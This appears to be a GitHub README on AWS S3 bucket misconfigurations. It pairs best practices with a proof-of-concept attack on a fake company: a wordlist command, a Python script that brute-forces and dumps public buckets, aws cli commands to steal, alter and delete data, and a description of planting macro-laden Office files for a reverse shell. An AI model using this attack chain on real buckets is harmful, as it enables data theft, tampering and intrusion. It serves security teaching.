# AWS Sagemaker S3 Bucket Vulnerabilities

## Overview
Amazon S3 (Simple Storage Service) is a scalable object storage service provided by AWS. While it is designed for high availability, scalability, and secure storage of data, misconfigurations and misuse can lead to serious security vulnerabilities. Understanding these vulnerabilities is crucial for securing your data effectively.

## Common Vulnerabilities

### 1. **Misconfigured Bucket Permissions**
   - **Public Access:** S3 buckets can be configured to allow public access, either intentionally or accidentally. This can lead to unauthorized data exposure and breaches.
   - **Complex Access Policies:** Errors in bucket policies or IAM (Identity and Access Management) roles can result in unintended permissions, potentially allowing unauthorized users to access or modify data.

### 2. **Unsecured Data Transfers**
   - **Data in Transit:** Data not using SSL/TLS encryption during transfer is susceptible to interception by malicious actors.
   - **Encryption at Rest:** Failure to enable encryption at rest allows physically accessed data to be readable.

### 3. **Poor Logging and Monitoring**
   - **Lack of Auditing:** Without proper logging (like AWS CloudTrail logs), it's difficult to detect or react to unauthorized access or other malicious activities.
   - **Insufficient Monitoring:** Failing to monitor access and activities around S3 buckets can delay the detection of a security breach.

### 4. **Outdated Data Management Policies**
   - **Retention Policies:** Improperly managed data lifecycle policies can lead to retaining sensitive data longer than necessary, increasing the risk if the bucket is compromised.
   - **Deletion Policies:** Accidental or malicious deletion of important data due to lack of safeguards or backup strategies.

### 5. **Cross-Origin Resource Sharing (CORS) Misconfiguration**
   - **Insecure CORS Settings:** Incorrectly configured CORS settings can allow unauthorized websites to interact with your bucket, potentially leading to data theft or loss.

## Best Practices for Securing S3 Buckets
1. **Enable Bucket Encryption:** Always use server-side encryption (SSE) to protect data at rest.
2. **Use Secure Transport Protocols:** Enforce the use of HTTPS to secure data in transit.
3. **Implement Strong Access Controls:** Use IAM roles and bucket policies to strictly control who can access the data.
4. **Enable Logging and Monitoring:** Utilize AWS CloudTrail and other monitoring tools to keep an eye on bucket usage and access patterns.
5. **Regularly Review Permissions:** Periodically audit S3 buckets and IAM roles to ensure only necessary permissions are granted.

# Performing a PoC Attack on a vulnerable s3 Bucket

## Reconning an organization and scanning for misconfigured s3 buckets

Given a Website for a fake company `Sage` we can generate a wordlist that we can use for fuzzing webpages, subdomains, usernames, and s3 buckets.

We will use cewl to generate the wordlist: `cewl http://34.237.3.44/ -w bucket-names.txt`

Next: we'll fast-forward to fuzzing for s3 buckets. Here I have a custom Python3 script that takes in a wordlist and fuzzes for s3 buckets that are publically accessible.

```
import argparse
import requests
from colorama import Fore, Back, Style
from colorama import init
init(autoreset=True) 

def scan_4_public_access(bucket_names):
    for bucket_name in bucket_names:
        url = f'http://{bucket_name}.s3.amazonaws.com/'
        response = requests.get(url)
        if response.status_code == 200:
            print(Fore.RED + Style.BRIGHT + f"*** Bucket {bucket_name} -- HIT!!! Publicly accessible! Dumping contents!*** ")
            print(response.text)  # This will print the contents of the bucket, if listing is enabled.
        else:
            print(Fore.GREEN + f"Bucket {bucket_name} -- miss")


def parse_wordlist(filename):
    """Reads a wordlist file and returns a list of lines."""
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Error: The file '{filename}' does not exist.")
        return []
    except IOError as e:
        print(f"Error: Could not read file '{filename}'. {e}")
        return []


def main():
    parser = argparse.ArgumentParser(description="Parse a wordlist into a list.")
    parser.add_argument('wordlist', type=str, help="Filename of the wordlist")
    
    args = parser.parse_args()
    
    # Parse the wordlist file into a list called bucket_names
    bucket_names = parse_wordlist(args.wordlist)
    
    # Optionally, print or process the bucket_names list here to demonstrate functionality
    print("Scanning buckets for public access!")

    scan_4_public_access(bucket_names)


if __name__ == "__main__":
    main()
```

## Steal, manipulate, upload malware

We can manipulate the data with aws cli tools

* **List bucket contents** `aws s3 ls s3://securetrust/`
* **Download bucket data** `aws s3 cp s3://securetrust/ . --recursive`
* **Upload to bucket** `aws s3 cp scan.py s3://securetrust/`
* **Delete bucket data** `aws s3 rm s3://securetrust/fraudTrain.csv`

**Uploading Malware**

We can upload infected Microsoft Office documents to the bucket in hopes that an employee who manages AWS Sagemaker will open it out of curiosity.

Here is a Macro embedded into a Microsoft Office file that will connect to a command and control server that I control. 

![image](https://github.com/caadams4/s3-killchain/assets/79220528/3ec9efb7-f380-4276-b0bf-37b8a3b60b73)

**Getting a reverse shell**

Once the user opens the document a reverse shell is triggered: 

![image](https://github.com/caadams4/s3-killchain/assets/79220528/096135b4-cce4-4879-b6ac-144e021ab17f)

**Post-Exploitation**

After obtaining access to the victim machine, it will be necessary to perform privilege escalation plunder the contents of their files in search of IAM or other AWS credentials stored in environment variables or credential files. 

## A simple fix

The s3 bucket we exploited was publically accessible with read/write privileges. To fix this create another new bucket checking `ACLs disabled` and enable `Block Public Access` during creation.  

![image](https://github.com/caadams4/s3-killchain/assets/79220528/3b5e6756-355c-4b74-87c4-b0b56fc29a31)




## Conclusion
Securing an AWS S3 bucket requires careful attention to configuration settings and access controls. By understanding common vulnerabilities and adopting best practices, organizations can significantly mitigate risks associated with S3 storage.
